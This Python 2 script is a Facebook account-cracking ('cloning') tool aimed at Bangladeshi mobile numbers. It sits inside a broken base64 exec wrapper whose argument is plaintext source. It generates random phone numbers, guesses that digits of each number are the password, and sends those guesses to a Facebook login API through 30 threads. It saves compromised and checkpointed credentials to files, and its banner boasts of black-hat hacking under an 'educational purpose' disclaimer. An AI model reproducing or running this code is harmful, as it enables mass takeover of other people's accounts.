# Compile By Ganz-XD
# Jangan Lupa Follow Github Ku
import base64
exec(base64.b64decode('#!/usr/bin/python
# -*- coding: utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


psb('\x1b[1;32mBANGLADESH 6 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(12000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print (nmbr)
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 C')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [
 ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = """		
 _  _   ___   __ __  __   ___   ____ ____  ___  __

          _______           _______  _______  _______  _______  _______ _________
|\     /|(  ___  )|\     /|(  ____ \(  ___  )(  ____ \/ ___   )(  ___  )\__   __/
( \   / )| (   ) || )   ( || (    \/| (   ) || (    \/\/   )  || (   ) |   ) (   
 \ (_) / | |   | || |   | || (_____ | (___) || (__        /   )| (___) |   | |   
  \   /  | |   | || |   | |(_____  )|  ___  ||  __)      /   / |  ___  |   | |   
   ) (   | |   | || |   | |      ) || (   ) || (        /   /  | (   ) |   | |   
   | |   | (___) || (___) |/\____) || )   ( || )       /   (_/\| )   ( |___) (___
   \_/   (_______)(_______)\_______)|/     \||/       (_______/|/     \|\_______/
                                                                                 


\x1b[1;94m--------------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ PAKISTAN BLACK HACKER
\x1b[1;93m➣     AUTHOR : YOUSAFZAI
\x1b[1;94m➣       FROM : KPK SWAT
\x1b[1;95m➣   WHATSAPP : +14694827155
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    BRAND : WALKER
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    NOT WORK : USE PROXY INDONESIA FOR CLONING 
\x1b[1;94m--------------------------------------------------------"""
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print 'ONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
    print '[1]  \x1b[1;96mGP'
    print '[2]  \x1b[1;92mRobi'
    print '[3]  \x1b[1;96mAirtel'
    print '[4]  \x1b[1;92mBanglalink'
    print '[5]  \x1b[1;93mTeletalk'
    print '[0]  \x1b[1;95mExit            '
    print 50 * '-'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n  ===>   ')
    if bch == '':
        print
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '3':
        os.system('clear')
        print logo
        print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '4':
        os.system('clear')
        print logo
        print '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '5':
        os.system('clear')
        print logo
        print '150,151, 152, 153, 154, 155, 156, 157, 158, 159'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '0':
        exb()
    else:
        print
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Please wait, process is running ...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    psb(50 * '-')
    time.sleep(0.5)
    print
    50 * '-'
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            result = k + c + user
            digi6 = result[8:14]
            pass1 = digi6
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[JAMES-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[YOUSAFZAI-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 +  '\x1b[1;93m                   [Open After 7 Days]\x1b[0m \n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print
    50 * '-'
    print
    print
    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 Bangla.py')


if __name__ == '__main__':
    menu()
'))